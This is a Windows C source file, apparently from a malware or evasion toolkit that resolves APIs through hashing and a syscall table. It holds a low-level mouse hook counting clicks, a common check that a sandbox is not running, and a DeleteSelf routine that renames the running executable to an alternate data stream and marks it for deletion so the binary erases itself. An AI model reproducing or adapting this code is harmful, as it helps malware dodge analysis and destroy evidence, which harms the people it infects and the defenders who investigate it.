
#include <windows.h>

#include "common.h"
#include "structs.h"

extern VX_TABLE g_Sys;
extern API_HASHING g_Api;

HHOOK g_hMouseHook = NULL;

DWORD g_dwMouseClicks = 0;

//------------------------------------------------------------------------------------------------------------------------------------------------//
//------------------------------------------------------------------------------------------------------------------------------------------------//

LRESULT CALLBACK HookEvent(int nCode, WPARAM wParam, LPARAM lParam) {

  // WM_RBUTTONDOWN :         "Right Mouse Click"
  // WM_LBUTTONDOWN :         "Left Mouse Click"
  // WM_MBUTTONDOWN :         "Middle Mouse Click"

  if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN ||
      wParam == WM_MBUTTONDOWN) {
    g_dwMouseClicks++;
  }

  return g_Api.pCallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
}

BOOL MouseClicksLogger() {

  MSG Msg = {0};

  // installing hook
  g_hMouseHook =
      g_Api.pSetWindowsHookExW(WH_MOUSE_LL, (HOOKPROC)HookEvent, NULL, 0);
  if (!g_hMouseHook) {
  }

  // process unhandled events
  while (g_Api.pGetMessageW(&Msg, NULL, 0, 0)) {
    g_Api.pDefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);
  }

  return TRUE;
}

BOOL DeleteSelf() {

  WCHAR szPath[MAX_PATH * 2] = {0};
  FILE_DISPOSITION_INFO Delete = {0};
  HANDLE hFile = INVALID_HANDLE_VALUE;
  PFILE_RENAME_INFO pRename = NULL;
  const wchar_t *NewStream = (const wchar_t *)NEW_STREAM;
  SIZE_T sRename = sizeof(FILE_RENAME_INFO) + sizeof(NEW_STREAM);

  // allocating enough buffer for the 'FILE_RENAME_INFO' structure
  pRename = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
  if (!pRename) {
    return FALSE;
  }

  ZeroMemory(szPath, sizeof(szPath));
  ZeroMemory(&Delete, sizeof(FILE_DISPOSITION_INFO));

  Delete.DeleteFile = TRUE;

  pRename->FileNameLength = sizeof(NEW_STREAM);
  RtlCopyMemory(pRename->FileName, NewStream, sizeof(NEW_STREAM));

  if (g_Api.pGetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {

    return FALSE;
  }

  hFile = g_Api.pCreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ,
                             NULL, OPEN_EXISTING, 0, NULL);
  if (hFile == INVALID_HANDLE_VALUE) {

    return FALSE;
  }

  if (!g_Api.pSetFileInformationByHandle(hFile, FileRenameInfo, pRename,
                                         sRename)) {

    return FALSE;
  }

  g_Api.pCloseHandle(hFile);

  hFile = g_Api.pCreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ,
                             NULL, OPEN_EXISTING, 0, NULL);
  if (hFile == INVALID_HANDLE_VALUE && GetLastError() == ERROR_FILE_NOT_FOUND) {
    return TRUE;
  }
  if (hFile == INVALID_HANDLE_VALUE) {

    return FALSE;
  }

  if (!g_Api.pSetFileInformationByHandle(hFile, FileDispositionInfo, &Delete,
                                         sizeof(Delete))) {

    return FALSE;
  }

  g_Api.pCloseHandle(hFile);
  HeapFree(GetProcessHeap(), 0, pRename);

  return TRUE;
}
